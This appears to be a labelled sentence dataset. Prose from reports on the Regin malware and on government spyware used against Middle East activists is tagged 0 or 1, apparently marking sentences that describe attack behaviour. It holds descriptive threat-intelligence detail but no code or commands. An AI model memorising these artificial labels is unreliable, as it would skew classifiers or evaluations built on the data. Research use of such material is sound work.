This information can be combined with another cookie for validation under the names USERIDTK , UID , GRID , UID=PREF=ID , TM , utma , LM , TMARK , VERSION , or CURRENT .	0
The C & C operations are undertaken by various modules , including major groups C373h , 19h , 9 , as well as Stage 5 payloads , such as C375h and 1Bh .	1
Regin logs data to the ApplicationLog.dat file .	1
This file is not an encrypted container , but it is encrypted and compressed .	1
Regin can be distributed with various payload modules or receive payload modules after infection .	1
The extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in order to enhance Regin 's capabilities .	0
Furthermore , we have found data files accompanying payload modules that have not been recovered .	0
The following table describes the Stage 4 kernel payload modules and Stage 5 user mode payload modules , which we have seen several variants of Regin use .	0
The IIS web server log stealing module , 27E9h , is an example of a payload module that was installed after the initial infection and was specifically deployed for a particular target .	1
Only a small amount of the 64-bit Regin files have been recovered .	0
These samples may represent version 2.0 or their differences may possibly be solely specific to 64-bit versions of Regin .	0
We also recovered files from infected computers that may or may not be associated with 64-bit Regin , including several variants of svcsstat.exe , a file that aims to retrieve binary data over pipes or sockets and execute the data .	1
The recovered files do not appear to fundamentally vary from their 32-bit counterparts , apart from a few noteworthy differences .	0
The 32-bit and 64-bit versions of Regin use different file names .	0
These differences are shown in the first section of this paper as well as in the appendix .	0
Most importantly , in the 64-bit version of Regin , the names of containers are changed : The 64-bit version of Regin 's Stage 1 ( wshnetc.dll ) is no longer a kernel mode driver , as drivers under 64-bit Windows must be signed .	0
Instead , Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting up .	1
Rather than loading Stage 2 from an NTFS extended attribute , Stage 1 looks for the last partition ( in terms of physical location ) on disk and searches for the payload in the raw sectors in this area of the disk .	1
The 64-bit Regin 's Stage 3 has not been recovered .	0
We believe that it may not exist , as the 32-bit version is a driver .	0
Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export functionality .	0
No Stage 5 payload modules have been recovered .	0
Regin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering campaigns .	1
The development and operation of this threat would have required a significant investment of time and resources .	0
Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware .	0
The discovery of Regin serves to highlight how significant investments continue to be made into the development of tools for use in intelligence gathering .	0
Many components of Regin have still gone undiscovered and additional functionality and versions may exist .	0
Symantec and Norton products detect this threat as Backdoor.Regin .	0
Regin 's data files are classified as Stage 5 components and are contained in an EVFS container .	0
As the data files are stored in a container , they do not have names .	0
Just like Stage 5 modules , they are referenced by their filetag , which is the aggregation of the major and minor identifiers .	0
The major identifier indicates which major routine group likely handles or creates the file .	0
Not all data files have been recovered , so the information remains incomplete .	0
Data files associated with Stage 4 kernel modules have not been recovered Table 8 lists recovered data files used by Stage 5 modules .	0
The associated modules that supposedly manipulate those data files were not recovered .	0
The following details can be used to help determine whether you have been impacted by this threat .	0
Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the European Union and a Belgian telecommunications company , according to security industry sources and technical analysis conducted by The Intercept .	0
Regin was found on infected internal computer systems and email servers at Belgacom , a partly state-owned Belgian phone and internet provider , following reports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications Headquarters , industry sources told The Intercept .	1
The malware , which steals data from infected systems and disguises itself as legitimate Microsoft software , has also been identified on the same European Union computer systems that were targeted for surveillance by the National Security Agency .	1
The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward Snowden .	0
The specific malware used in the attacks has never been disclosed , however .	0
The Regin malware , whose existence was first reported by the security firm Symantec on Sunday , is among the most sophisticated ever discovered by researchers .	0
Symantec compared Regin to Stuxnet , a state-sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility .	0
Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their systems after they were compromised , linking the spy tool to the secret GCHQ and NSA operations .	0
Ronald Prins , a security expert whose company Fox IT was hired to remove the malware from Belgacom 's networks , told The Intercept that it was '' the most sophisticated malware '' he had ever studied .	0
'' Having analyzed this malware and looked at the [ previously published ] Snowden documents , '' Prins said , '' I 'm convinced Regin is used by British and American intelligence services .	0
'' A spokesman for Belgacom declined to comment specifically about the Regin revelations , but said that the company had shared '' every element about the attack '' with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion .	0
'' It 's impossible for us to comment on this , '' said Jan Margot , a spokesman for Belgacom .	0
'' It 's always been clear to us the malware was highly sophisticated , but ever since the clean-up this whole story belongs to the past for us .	0
'' In a hacking mission codenamed Operation Socialist , GCHQ gained access to Belgacom 's internal systems in 2010 by targeting engineers at the company .	1
The agency secretly installed so-called malware '' implants '' on the employees ' computers by sending their internet connection to a fake LinkedIn page .	0
The malicious LinkedIn page launched a malware attack , infecting the employees ' computers and giving the spies total control of their systems , allowing GCHQ to get deep inside Belgacom 's networks to steal data .	1
The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the company 's network and customers , which include the European Commission , the European Parliament , and the European Council .	1
The software implants used in this case were part of the suite of malware now known as Regin .	0
One of the keys to Regin is its stealth : To avoid detection and frustrate analysis , malware used in such operations frequently adhere to a modular design .	1
This involves the deployment of the malware in stages , making it more difficult to analyze and mitigating certain risks of being caught .	0
Based on an analysis of the malware samples , Regin appears to have been developed over the course of more than a decade ; The Intercept has identified traces of its components dating back as far as 2003 .	0
Regin was mentioned at a recent Hack.lu conference in Luxembourg , and Symantec 's report on Sunday said the firm had identified Regin on infected systems operated by private companies , government entities , and research institutes in countries such as Russia , Saudi Arabia , Mexico , Ireland , Belgium , and Iran .	0
The use of hacking techniques and malware in state-sponsored espionage has been publicly documented over the last few years : China has been linked to extensive cyber espionage , and recently the Russian government was also alleged to have been behind a cyber attack on the White House .	0
Regin further demonstrates that Western intelligence agencies are also involved in covert cyberespionage .	0
GCHQ declined to comment for this story .	0
The agency issued its standard response to inquiries , saying that '' it is longstanding policy that we do not comment on intelligence matters '' and '' all of GCHQ 's work is carried out in accordance with a strict legal and policy framework , which ensures that our activities are authorised , necessary and proportionate .	0
'' The NSA said in a statement , '' We are not going to comment on The Intercept 's speculation .	0
'' The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to encourage further research and analysis .	0
( To download the malware , click here .	0
The file is encrypted ; to access it on your machine use the password '' infected .	0
'' ) What follows is a brief technical analysis of Regin conducted by The Intercept 's computer security staff .	0
Regin is an extremely complex , multi-faceted piece of work and this is by no means a definitive analysis .	0
In the coming weeks , The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian and Dutch newspapers De Standaard and NRC Handelsblad .	0
In Nordic mythology , the name Regin is associated with a violent dwarf who is corrupted by greed .	0
It is unclear how the Regin malware first got its name , but the name appeared for the first time on the VirusTotal website on March 9th 2011 .	0
Der Spiegel reported that , according to Snowden documents , the computer networks of the European Union were infiltrated by the NSA in the months before the first discovery of Regin .	0
Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided samples of its code .	0
This discovery , the sources said , may have been what brought Regin to the wider attention of security vendors .	0
Also on March 9th 2011 , Microsoft added related entries to its Malware Encyclopedia : Two more variants of Regin have been added to the Encyclopedia , Regin.B and Regin.C .	0
Microsoft appears to detect the 64-bit variants of Regin as Prax.A and Prax.B .	0
None of the Regin/Prax entries are provided with any sort of summary or technical information .	0
The following Regin components have been identified : The first stage are drivers which act as loaders for a second stage .	1
They have an encrypted block which points to the location of the 2nd stage payload .	0
On NTFS , that is an Extended Attribute Stream ; on FAT , they use the registry to store the body .	0
When started , this stage simply loads and executes Stage 2 .	1
The Regin loaders that are disguised as Microsoft drivers with names such as : Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems .	1
When launched , it cleans traces of the initial loader , loads the next part of the toolkit and monitors its execution .	1
On failure , Stage 2 is able to disinfect the compromised device .	1
The malware zeroes out its PE ( Portable Executable , the Windows executable format ) headers in memory , replacing '' MZ '' with its own magic marker 0xfedcbafe .	1
This component consists of a service orchestrator working in Windows ' kernel .	0
It initializes the core components of the architecture and loads the next parts of the malware .	1
This stage is composed of a service orchestrator located in user land , provided with many modules which are loaded dynamically as needed .	0
These modules can include data collectors , a self-defense engine which detects if attempts to detect the toolkit occur , functionality for encrypted communications , network capture programs , and remote controllers of different kinds .	1
The Intercept 's investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header , which is a sign that it might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit .	1
In order to access information stored in the computer 's memory , programs use objects that reference specific locations in memory called pointers .	1
This binary file contains some of such pointers initialized , which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised system .	1
The sample has the following SHA256 hash : This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible .	0
When a Windows kernel driver needs to allocate memory to store some type of data , it creates so called kernel pools .	0
Such memory allocations have specific headers and tags that are used to identify the type of objects contained within the block .	0
For example such tags could be Proc , Thrd or File , which respectively indicate that the given block would contain a process , thread or file object structure .	0
When performing forensic analysis of a computer 's memory , it is common to use a technique called pool scanning to parse the kernel memory , enumerate such kernel pools , identify the type of content and extract it .	0
Just like Regin loader drivers , this driver repeatedly uses the generic '' Ddk '' tag with ExAllocatePoolWithTag ( ) when allocating all kernel pools : The generic tag which is used throughout the operating system when a proper tag is not specified .	0
This makes it more difficult for forensic analysts to find any useful information when doing pool scanning , since all its memory allocations will mix with many generic others .	0
In addition , when freeing memory using ExFreePool ( ) , the driver zeroes the content , probably to avoid leaving traces in pool memory .	1
The driver also contains routines to check for specific builds of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server and Windows 2000 , and then adapts its behavior accordingly .	1
Windows kernel drivers operate on different levels of priority , from the lowest PASSIVELEVEL to the highest HIGHLEVEL .	0
This level is used by the processor to know what service give execution priority to and to make sure that the system does n't try to allocate used resources which could result in a crash .	0
This Regin driver recurrently checks that the current IRQL ( Interrupt Request Level ) is set to PASSIVELEVEL using the KeGetCurrentIrql ( ) function in many parts of the code , probably in order to operate as silently as possible and to prevent possible IRQL confusion .	1
This technique is another example of the level of precaution the developers took while designing this malware framework .	0
Upon execution of the unload routine ( located at 0xFDEFA04A ) , the driver performs a long sequence of steps to remove remaining traces and artifacts .	1
In an interview given to the Belgian magazine MondiaalNiews , Fabrice Clément , head of security of Belgacom , said that the company first identified the attack on June 21 , 2013 .	0
In the same interview Clément says that the computers targeted by the attackers included staff workstations as well as email servers .	0
These statements confirm the timing and techniques used in the attack .	0
From previously identified Regin samples , The Intercept developed unique signatures which could identify this toolkit .	0
A zip archive with a sample identified as Regin/Prax was found in VirusTotal , a free , online website which allows people to submit files to be scanned by several anti-virus products .	0
The zip archive was submitted on 2013-06-21 07:58:37 UTC from Belgium , the date identified by Clément .	0
Sources familiar with the Belgacom intrusion told The Intercept that this sample was uploaded by a systems administrator at the company , who discovered the malware and uploaded it in an attempt to research what type of malware it was .	0
The archive contains : Along with other files The Intercept found the output of a forensic tool , GetThis , which is being run on target systems looking for malware .	0
From the content of the GetThis.log file , we can see that a sample called '' svcsstat.exe '' and located in C : \Windows\System32\ was collected and a copy of it was stored .	0
The malware in question is '' 0001000000000C1Csvcsstat.exesample '' .	0
This is a 64bit variant of the first stage Regin loader aforementioned .	0
The archive also contains the output of ProcMon , '' Process Monitor '' , a system monitoring tool distributed by Microsoft and commonly used in forensics and intrusion analysis .	0
This file identifies the infected system and provides a variety of interesting information about the network .	0
For instance : The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server , indicating that it might one of the compromised corporate mail server Fabrice Clément mentioned to Mondiaal News : Below is a list of hashes for the files The Intercept is making available for download .	0
Given that that it has been over a year since the Belgacom operation was publicly outed , The Intercept considers it likely that the GCHQ/NSA has replaced their toolkit and no current operations will be affected by the publication of these samples .	0
Repressive nation-states have long monitored telecommunica- tions to keep tabs on political dissent .	0
The Internet and online social networks , however , pose novel technical challenges to this practice , even as they open up new domains for surveil- lance .	0
We analyze an extensive collection of suspicious files and links targeting activists , opposition members , and non- governmental organizations in the Middle East over the past several years .	0
We find that these artifacts reflect efforts to at- tack targets ' devices for the purposes of eavesdropping , stealing information , and/or unmasking anonymous users .	0
We describe attack campaigns we have observed in Bahrain , Syria , and the United Arab Emirates , investigating attackers , tools , and tech- niques .	0
In addition to off-the-shelf remote access trojans and the use of third-party IP-tracking services , we identify commer- cial spyware marketed exclusively to governments , including Gamma 's FinSpy and Hacking Team 's Remote Control Sys- tem ( RCS ) .	0
We describe their use in Bahrain and the UAE , and map out the potential broader scope of this activity by conduct- ing global scans of the corresponding command-and-control ( C & C ) servers .	0
Finally , we frame the real-world consequences of these campaigns via strong circumstantial evidence linking hacking to arrests , interrogations , and imprisonment .	0
Computer security research devotes extensive efforts to pro- tecting individuals against indiscriminate , large-scale attacks such as those used by cybercriminals .	0
Recently , the prob- lem of protecting institutions against targeted attacks conducted by nation-states ( so-called '' Advanced Persistent Threats '' ) has likewise elicited significant research interest .	0
Where these two problem domains intersect , however-targeted cyber attacks by nation-states against individuals-has received virtually no sig- nificant , methodical research attention to date .	0
This new prob- lem space poses challenges that are both technically complex and of significant real-world importance .	0
In this work we undertake to characterize the emergent prob- lem space of nation-state Internet attacks against individuals engaged in pro-democracy or opposition movements .	0
While we lack the data to do so in a fully comprehensive fashion , we provide extensive detail from both technical and operational perspectives as seen in three countries .	0
We view such character- izations as the fundamental first step necessary for the rigorous , scientific pursuit of a new problem space .	0
For our study we draw upon several years of research we have conducted into cases from Bahrain , Syria and the United Arab Emirates .	0
We frame the nature of these attacks , and the technology and infrastructure used to conduct them , in the con- text of their impacts on real people .	0
We hope in the process to inspire additional research efforts addressing the difficult prob- lem of how to adequately protect individuals with very limited resources facing powerful adversaries .	0
As an illustration of this phenomenon , consider the follow- ing anecdote , pieced together from public reports and court documents .	0
At dawn on 3/12/13 , police raided the house of 17-year- old Ali Al-Shofa , confiscated his laptop and phone , and took him into custody .	0
He was charged with referring to Bahrain's King as a '' dictator '' ( ) and '' fallen one '' ( ) on a pseudonymous Twitter account , @ alkawarahnews .	0
Accord- ing to court documents , Bahrain 's Cyber Crime Unit had linked an IP address registered in his father 's name to the account on 12/9/12 .	0
Operators of @ alkawarahnews later forwarded a suspicious private message to one of the authors .	0
The message was received on 12/8/12 on a Facebook account linked to the Twitter handle , and contained a link to a protest video , purport- edly sent by an anti-government individual .	0
The link redirected through iplogger.org , a service that records the IP address of anyone who clicks .	0
Analytics for the link indicate that it had been clicked once from inside Bahrain .	0
On 6/25/13 , Ali was sentenced to one year in prison .	0
Ali 's case is an example of the larger phenomenon we in- vestigate : attacks against activists , dissidents , trade unionists , human rights campaigners , journalists , and members of NGOs ( henceforth '' targets '' ) in the Middle East .	0
The attacks we have documented usually involve the use of malicious links or e-mail attachments , designed to obtain information from a device .	1
On the one hand , we have observed attacks using a wide range of off-the-shelf spyware , as well as publicly available third-party services , like iplogger.org .	1
On the other hand , some at- tacks use so-called '' lawful intercept '' trojans and related equip- ment , purportedly sold exclusively to governments by compa- nies like Gamma International and Hacking Team .	1
The lat- ter advertises that governments need its technology to '' look through their target 's eyes '' rather than rely solely on '' passive monitoring '' .	0
Overall , the attacks we document are rarely technically novel .	0
In fact , we suspect that the majority of at- tacks could be substantially limited via well-known security practices , settings , and software updates .	0
Yet , the attacks are noteworthy for their careful social engineering , their links to governments , and their real-world impact .	1
We obtained the majority of our artifacts by encouraging in- dividuals who might be targeted by governments to provide us with suspicious files and unsolicited links , especially from un- familiar senders .	0
While this process has provided a rich set of artifacts to analyze , it does not permit us to claim our dataset is representative .	0
Our analysis links these attacks with a common class of ac- tor : an attacker whose behavior , choice of target , or use of in- formation obtained in the attack , aligns with the interests of a government .	0
In some cases , such as Ali 's , the attackers appear to be governments themselves ; in other cases , they appear in- stead to be pro-government actors , ranging from patriotic , not necessarily skilled volunteers to cyber mercenaries .	0
The phe- nomenon has been identified before , such as in Libya , when the fall of Gaddafi 's regime revealed direct government ties to hacking during the 2011 Civil War .	0
We make the following contributions : • We analyze the technology associated with targeted at- tacks ( e.g. , malicious links , spyware ) , and trace it back to its programmers and manufacturers .	0
While the attacks are not novel-and indeed often involve technology used by the cybercrime underground-they are significant be- cause they have a real-world impact and visibility , and are connected to governments .	0
In addition , we often find amateurish mistakes in either the attacker 's technology or operations , indicating that energy spent countering these threats can realize significant benefits .	0
We do not , how- ever , conclude that all nation-state attacks or attackers are incompetent , and we suspect that some attacks have evaded our detection .	0
• When possible , we empirically characterize the attacks and technology we have observed .	0
We map out global use of two commercial hacking tools by governments by searching through Internet scan data using fingerprints for command-and-control ( C & C ) servers derived from our spyware analysis .	0
• We develop strong evidence tying attacks to govern- ment sponsors and corporate suppliers , countering de- nials , sometimes energetic and sometimes indirect , of such involvement [ , , , ] , in contrast to denials or claims of a corporate '' oversight '' board .	0
Our scan- ning suggests use of '' lawful intercept '' trojans by 11 ad- ditional countries considered governed by '' authoritarian regimes .	0
'' We believe that activists and journalists in such countries may experience harassment or consequences to life or liberty from government surveillance .	0
Finally , we do not explore potential defenses appropriate for protecting the target population in this work .	0
We believe that to do so in a sufficiently well-grounded , meaningful manner first requires developing an understanding of the targets ' knowledge of security issues , their posture regarding how they currently protect themselves , and the resources ( including potentially ed- ucation ) that they can draw upon .	0
To this end , we are now con- ducting ( with IRB approval ) in-depth interviews with potential targets along with systematic examination of their Internet de- vices in order to develop such an understanding .	0
In the past decades , a rich body of academic work has grown to document and understand government Internet censorship , in- cluding nationwide censorship campaigns like the Great Fire- wall of China [ , , ] .	0
Research on governmental Internet surveillance and activities like law-enforcement interception is a comparatively smaller area .	0
Some academic work looks at government use of devices to enable censorship , such as key- word blacklists for Chinese chat clients , or the Green Dam censorware that was to be deployed on all new computers sold in China .	0
We are aware of only limited previous work looking at advanced threat actors targeting activists with hack- ing , though this work has not always been able to establish ev- idence of government connections .	0
Platforms used by potential targets , such as GMail , Twitter , and Facebook increasingly make transport- layer encryption the default , obscuring communications from most network surveillance .	0
This use of encryption , along with the global nature of many social movements , and the role of diaspora groups , likely makes hacking increasingly attractive , especially to states who are unable to request or compel content from these platforms .	0
Indeed , the increasing use of encryption and the global nature of targets have both been cited by pur- veyors of '' lawful intercept '' trojans in their marketing materi- als [ , ] .	0
In one notable case in 2009 , UAE telecom firm Eti- salat distributed a system update to its then 145,000 BlackBerry subscribers that contained spyware to read encrypted Black- Berry e-mail from the device .	0
The spyware was discovered when the update drastically slowed users ' phones .	0
In con- trast to country-scale distribution , our work looks at this kind of pro-government and government-linked surveillance through highly targeted attacks .	0
The term APT ( Advanced Persistent Threat ) refers to a sophisticated cyber-attacker who persistently attempts to tar- get an individual or group .	0
Work outside the academic community tracking government cyberattacks typically falls under this umbrella .	0
There has been significant work on APT outside the academic community , especially among se- curity professionals , threat intelligence companies , and human rights groups .	0
Much of this work has focused on suspected government-on-government or government-on-corporation cy- ber attacks [ , ] .	0
Meanwhile , a small but growing body of this research deals with attacks carried out by governments against opposition and activist groups operating within , as well as outside their borders .	0
One of the most notable cases is GhostNet , a large-scale cyber espionage campaign against the Tibetan independence movement [ , ] .	0
Other work avoids drawing conclusions about the attackers .	0
Our study is based on extensive analysis of malicious files and suspect communications relevant to the activities of targeted groups in Bahrain , Syria , and the UAE , as documented in Ta- ble 1 .	0
A number of the attacks had significant real-world impli- cations , per Table 2 .	0
In many cases , we keep our descriptions somewhat imprecise to avoid potential leakage of target identi- ties .	0
We began our work when contacted by individuals con- cerned that a government might have targeted them for cyber- attacks .	0
As we became more acquainted with the targeted com- munities , in some cases we contacted targeted groups directly ; in others , we reached out to individuals with connections to tar- geted groups , who allowed us to examine their communications with the groups .	0
For Bahrain and Syria , the work encompassed 10,000s of e-mails and instant messages .	0
For the UAE , the vol- ume is several thousand communications .	0
This following sections outline recent targeted hacking cam- paigns in Bahrain , Syria and the UAE .	0
These cases have a com- mon theme : attacks against targets ' computers and devices with malicious files and links .	0
In some cases the attackers employed expensive and '' government exclusive '' malware , while in other cases , attackers used cheap and readily available RATs .	1
Across these cases we find that clever social engineering often plays a central role , which is strong evidence of a well-informed ad- versary .	1
We also , however , frequently find technical and op- erational errors by the attackers that enable us to link attacks to governments .	0
In general , the attacks we find are not well- detected by anti-virus programs .	1
We have analyzed two attack campaigns in the context of Bahrain , where the government has been pursuing a crackdown against an Arab-Spring inspired uprising since 2/14/2011 .	0
The first involved malicious e-mails containing FinSpy , a '' lawful intercept '' trojan sold exclusively to governments .	1
The second involved specially crafted IP spy links and e-mails de- signed to reveal the IP addresses of operators of pseudonymous accounts .	1
Some individuals who apparently clicked on these links were later arrested , including Ali ( cf .	0
§1 ) , whose click appears to have been used against him in court .	0
While both campaigns point back to the government , we have not as yet identified overlap between the campaigns ; targets of FinSpy appeared to reside mainly outside Bahrain , whereas the IP spy links targeted those mainly inside the country .	0
We examine each campaign in turn .	0
Beginning in April 2012 , the authors received 5 suspicious e-mails from US and UK-based activists and journalists working on Bahrain .	0
We found that some of the attachments contained a PE ( .exe ) file designed to appear as an image .	1
Their filenames contained a Uni- code right-to-left override ( RLO ) character , causing Windows to render a filename such as gpj.1bajaR.exe instead as exe.Rajab1.jpg .	1
The other .rar files contained a Word document with an embedded ASCII-encoded PE file containing a custom macro set to automatically run upon document startup .	1
Under default security settings , Office disables all unsigned macros , so that a user who opens the document will only see an informational message that the macro has been disabled .	0
Thus , this attack was apparently designed with the belief or hope that targets would have reduced security settings .	0
Identification as FinSpy : By running the sample using Windows Virtual PC , we found the following string in mem- ory : y : \lsvnbranches\finspyv4.01\finspyv2\ .	0
This string suggests FinSpy , a product of Gamma Inter- national .	0
The executables used virtualized obfusca- tion , which appeared to be custom-designed .	1
We de- vised a fingerprint for the obfuscater and located a structurally similar executable by searching a large malware database .	0
This executable contained a similar string , except it identi- fied itself as FinSpy v3.00 , and attempted to connect to tiger.gamma-international.de , a domain registered to Gamma International GmbH .	1
Analysis of capabilities : We found that the spyware has a modular design , and can download additional modules from a command & control ( C & C ) server , including password cap- ture ( from over 20 applications ) and recording of screenshots , Skype chat , file transfers , and input from the computer 's micro- phone and webcam .	1
To exfiltrate data back to the C & C server , a module encrypts and writes it to disk in a special folder .	1
The spyware period- ically probes this folder for files that match a certain naming convention , then sends them to the C & C server .	1
It then over- writes the files , renames them several times , and deletes them , in an apparent effort to frustrate forensic analysis .	1
Analysis of encryption : Because the malware employed myriad known anti-debugging and anti-analysis techniques , it thwarted our attempts to attach debuggers .	1
Since it did not in- clude anti-VM code , we ran it in TEMU , an x86 emulator de- signed for malware analysis .	0
TEMU captures instruction- level execution traces and provides support for taint-tracking .	0
We found that FinSpy encrypts data using a custom imple- mentation of AES-256-CBC .	1
The 32 byte AES key and 16 byte IV are generated by repeatedly reading the low-order-4-bytes of the Windows clock .	1
The key and IV are encrypted using an em- bedded RSA-2048 public key , and stored in the same file as the data .	1
The private key presumably resides on the C & C server .	0
The weak AES keys make decryption of the data straightfor- ward .	0
We wrote a program that generally can find these keys in under an hour , exploiting the fact that many of the system clock readings occur within the same clock-update quantum .	0
In addition , FinSpy 's AES code fails to encrypt the last block of data if less than the AES block size of 128 bits , leaving trail- ing plaintext .	0
Finally , FinSpy 's wire protocol for C & C commu- nication uses the same type of encryption , and thus is subject to the same brute force attack on AES keys .	1
While we suspect FinSpy 's cryptographic deficiencies reflect bugs , it is also con- ceivable that the cryptography was deliberately weakened to facilitate one government monitoring the surveillance of oth- ers .	0
C & C server : The samples communicated with 77.69.140.194 , which belongs to a subscriber of Batelco , Bahrain 's main ISP .	1
Analyzing network traffic between our infected VM and the C & C server revealed that the server used a global IPID , which allowed us to infer server activity by its progression .	0
In response to our preliminary work an executive at Gamma told the press that Bahrain 's FinSpy server was merely a proxy and the real server could have been anywhere , as part of a claim that the Bahrain FinSpy deployment could have been associ- ated with another government .	0
However , a proxy would show gaps in a global IPID as it forwarded traffic ; our frequent observation of strictly consecutive IPIDs thus contradicts this statement .	0
Exploitation of captured data : Since we suspected the spy- ware operator would likely seek to exploit captured credentials , particularly those associated with Bahraini activist organiza- tions , we worked with Bahrain Watch , an activist organization inside Bahrain .	0
Bahrain Watch established a fake login page on their website and provided us with a username and pass- word .	0
From a clean VM , we logged in using these credentials , saving the password in Mozilla Firefox .	0
We then infected the VM with FinSpy and allowed it to connect to the Bahrain C & C server .	1
Bahrain Watch 's website logs revealed a subsequent hit from 89.148.0.41-made however to the site 's home- page , rather than its login page-coming shortly after we had infected the VM .	0
Decrypting packet captures of the spyware's activity , we found that our VM sent the password to the server exactly one minute earlier : The URL provided to the server did not include the path to the login page , which was inaccessible from the home- page .	0
This omission reflects the fact that the Firefox password database stores only domain names , not full login page URLs , for each password .	0
Repeating the experiment again yielded a hit from the same IP address within a minute .	0
We inspected Bahrain Watch 's logs , which showed no subsequent ( or previ- ous ) activity from that address , nor any instances of the same User Agent string .	0
In an IP spy attack , the attacker aims to discover the IP address of a victim who is typically the opera- tor of a pseudonymous social media or e-mail account .	1
The at- tacker sends the pseudonymous account a link to a webpage or an e-mail containing an embedded remote image , using one of many freely-available services .	1
When the victim clicks on the link or opens the e-mail , their IP address is revealed to the at- tacker .	1
The attacker then discovers the victim 's identity from their ISP .	0
In one case we identified legal documents that pro- vided a circumstantial link between such a spy link and a sub- sequent arrest .	0
Figure 2 illustrates the larger ecosystem of these attacks .	0
The attackers appear to represent a single entity , as the activity all connects back to accounts that sent links shortened using a par- ticular user account al9mood on the bit.ly URL shortening service .	0
Recall Ali Faisal Al-Shufa ( discussed in Section 1 ) , who was accused of sending insulting tweets from an account @ alkawarahnews ( Al Kawarah News in Figure 2 ) .	0
An op- erator of the account forwarded us a suspicious private message sent to the Al Kawarah News Facebook account from Red Sky .	0
Red Sky was purportedly arrested on 10/17/12 , was convicted of insulting the King on his Twitter account @ RedSky446 , and was sentenced to four months prison .	0
When released , he found that the passwords for his Twitter , Facebook , and e-mail accounts had been changed , and did not know how to recover his accounts .	0
The message that Red Sky 's account sent to Al Kawarah News included a link shortened using Google 's goo.gl ser- vice .	0
We used the goo.gl API to access analytics for the link , finding that it unshortened to iplogger.org/25SX and was created on 12/8/12 .	0
The link had received only one click , which came from Bahrain with the referrer www.facebook.com .	0
Ali 's case files contained a request from the Public Prose- cution for information on an IP address that it had linked to Al Kawarah News about 22 hours after the link was created .	0
Court documents indicate that ISP data linked the IP address to Ali , and on this basis he was sentenced to one year in prison .	0
Red Sky also targeted M in Figure 2 .	0
M recalled click- ing on a link from Red Sky while using an Internet connec- tion from one of the houses in M 's village .	0
The house was raided by police on 3/12/13 , who were looking for the sub- scriber of the house 's internet connection .	0
Police questioning revolved around Tweets that referred to Bahrain 's King as a '' cursed one .	0
'' Red Sky had earlier targeted other users with IP spy links shortened using the al9mood bit.ly account .	1
The attack on Jehad Abdulla is noteworthy , as the ac- count 's activity aligned with communities typically critical of Bahrain 's opposition .	0
However , the account also directly crit- icized the King on occasion , in one case referring to him as '' weak '' and '' stingy .	0
'' An account linked to al9mood sent Je- had Abdulla an IP spy link on 10/2/12 in a public message .	1
On 10/16/12 , Salman Darwish was arrested for insulting the King using the Jehad Abdulla account .	0
He was sentenced to one month in prison , partly on the basis of his confession .	0
Salman's father claims that police denied Salman food , drink , and medi- cal care .	0
Another account linked to al9mood targeted @ YLUBH , the Twitter account of Yokogawa Union , a trade union at the Bahraini branch of a Japanese company .	0
@ YLUBH received at least three IP spy links in late 2012 , sent via public Twitter mes sages .	1
Yokogawa fired the leader of the trade union , Sami Ab- dulaziz Hassan , on 3/23/13 .	0
It later emerged that Sami was indeed the operator of the @ YLUBH account , and that the police had called him in for questioning in relation to its tweets .	0
Use of embedded remote images : We identified several targets who received spoofed e-mails containing embedded remote images .	1
Figure 2 shows two such cases , Maryam and Sayed Yousif .	0
The attacker sent the e-mails using ReadNotify.com , which records the user 's IP address upon their mail client downloading the remote image .	1
While ReadNotify.com forbids spoofing in their TOS , the service has a vulnerability known to the attackers ( and which we confirmed ) that allows spoofing the From address by directly setting the parameters on a submission form on their website .	0
We have not found evidence suggesting this vulnerabil- ity is publicly known , but it appears clear that the attacker ex- ploited it , as the web form adds a X-Mai1er : RNwebmail header not added when sending through ReadNotify.com's other supported methods .	0
The header appeared in each e-mail the targets forwarded to us .	0
When spoofing using this method , the original sender ad- dress still appears in X-Sender and other headers .	0
Accord- ing to these , the e-mails received by the targets all came from fatoomah85 @ gmail.com .	0
A link sent in one of these e- mails was connected to the al9mood bit.ly account .	0
In monitoring accounts connected to al9mood , we counted more than 200 IP spy links in Twitter messages and public Facebook posts .	0
Attackers often used ( 1 ) accounts of promi- nent or trusted but jailed individuals like '' Red Sky , '' ( 2 ) fake personas ( e.g. , attractive women or fake job seekers when tar- geting a labor union ) , or ( 3 ) impersonations of legitimate ac- counts .	1
In one particularly clever tactic , attackers exploited Twitter 's default font , for example substituting a lowercase '' l '' with an uppercase '' I '' or switching vowels ( e.g .	0
from '' a '' to an '' e '' ) to create at-a-glance identical usernames .	0
In addition , malicious accounts tended to quickly delete IP spy tweets sent via ( public ) mentions , and frequently change profile names .	0
The use of RATs against the opposition has been a well- documented feature of the Syrian Civil War since the first re- ports were published in early 2012 [ , , , , ] .	0
The phenomenon is widespread , and in our experience , most mem- bers of the opposition know that some hacking is taking place .	0
As summarized in Table 3 , the attacks often include fake or ma- liciously packaged security tools ; intriguing , or ideological , or movement-relevant content ( e.g . lists of wanted persons ) .	1
The seeding techniques and bait files suggest a good understanding of the opposition 's needs , fears and behavior , coupled with ba- sic familiarity with off-the-shelf RATs .	0
In some cases attacks occur in a context that points to a more direct connection to one of the belligerents : the Syrian opposition has regularly ob- served that detainees ' accounts begin seeding malware shortly after their arrest by government forces .	0
